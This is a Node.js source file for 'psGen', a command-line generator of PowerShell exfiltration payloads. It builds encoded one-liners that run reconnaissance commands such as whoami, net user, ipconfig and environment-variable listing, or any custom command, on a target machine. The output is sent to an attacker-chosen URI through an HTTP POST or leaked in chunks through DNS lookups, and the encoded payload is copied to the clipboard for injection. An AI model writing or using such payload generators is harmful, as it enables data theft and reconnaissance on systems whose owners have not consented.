import clipboardy from "clipboardy";
import minimist from "minimist";
import promptSync from "prompt-sync";

const prompt = promptSync();

const curlPayload = (uri, command) => {
  let curlShell = `Invoke-RestMethod -Method 'Post' -Uri '${uri}' -Body @{data = ([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((${command} | Out-String)))).replace('=','')}`;
  let curlBase64 = Buffer.from(Buffer.from(curlShell, "utf16le")).toString(
    "base64"
  );
  console.log(curlShell);
  clipboardy.writeSync(curlBase64);
};

const dnsPayload = (uri, command, length) => {
  let dnsShell = `$array = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((${command} | Out-String))).replace('=','') -split '(.{${length}})' -ne '';For ($i=0; $i -lt $array.Length; $i++) {ping -n 1 "$($i)$($array[$i]).${uri}"}`;
  let dnsBase64 = Buffer.from(Buffer.from(dnsShell, "utf16le")).toString(
    "base64"
  );
  console.log(dnsShell);
  clipboardy.writeSync(dnsBase64);
};

let errorMsg = `Incorrect arguments. Type -h for help`;
let helpMsg =
  "Welcome to psGen!\n-m: Type of OOB interaction\n-c : Type of command payload should run\n-l : Length of subdomain to be used\n-u : Target URI to be used\n-h : Help with usage. For more info, chain commands(-h t)";
var argv = minimist(process.argv.slice(2));

if (Object.keys(argv).length === 1) {
  console.log(errorMsg);
} else {
  if ("h" in argv) {
    switch (argv["h"]) {
      case "m":
        console.log("Type of Method to use for OOB. Either DNS or CURL");
        break;
      case "c":
        console.log(
          "Type of command to run.\n1: OS Version\n2: OS Adapter details\n3: Current user details\n4: All users in target\n5: Get Environment Variables\n6: Get directory data\nDefault: Custom command"
        );
        break;
      case "l":
        console.log("Length to be used for dns calls. Max is 63");
        break;
      case "u":
        console.log("URI to be used for payload interactions");
        break;
      default:
        console.log(helpMsg);
    }
  } else {
    if (
      !("m" in argv) ||
      !("c" in argv) ||
      !("l" in argv) ||
      !("u" in argv) ||
      !["dns", "curl"].includes(argv["m"]) ||
      parseInt(argv["c"]) > 7 ||
      isNaN(parseInt(argv["c"])) ||
      argv["l"] > 63 ||
      isNaN(argv["l"])
    ) {
      console.error(errorMsg);
    } else {
      let [method, command, length, url] = [
        argv["m"],
        argv["c"],
        argv["l"],
        argv["u"],
      ];
      let psFunction;
      switch (command) {
        case 1:
          console.log("OS Version payload");
          psFunction = `(Get-WmiObject -class Win32_OperatingSystem).Caption`;
          break;
        case 2:
          console.log("OS Adaptor details");
          psFunction = `ipconfig`;
          break;
        case 3:
          console.log("Current user details");
          psFunction = `whoami`;
          break;
        case 4:
          console.log("All users in target");
          psFunction = `net user`;
          break;
        case 5:
          console.log("Get Environment variables");
          psFunction = `Get-ChildItem -Path Env:`;
          break;
        case 6:
          console.log("Get directory data");
          psFunction = `Get-ChildItem`;
          break;
        case 7:
          psFunction = prompt("Please enter your custom command:");
          console.log(psFunction);
          break;
        default:
          console.log("helpMsg");
      }
      console.log(`Making Payload: ${method}, ${command}, ${length}, ${url}`);
      if (method === 'curl') curlPayload(url, psFunction);
      if (method === 'dns') dnsPayload(url, psFunction, length);
    }
  }
}
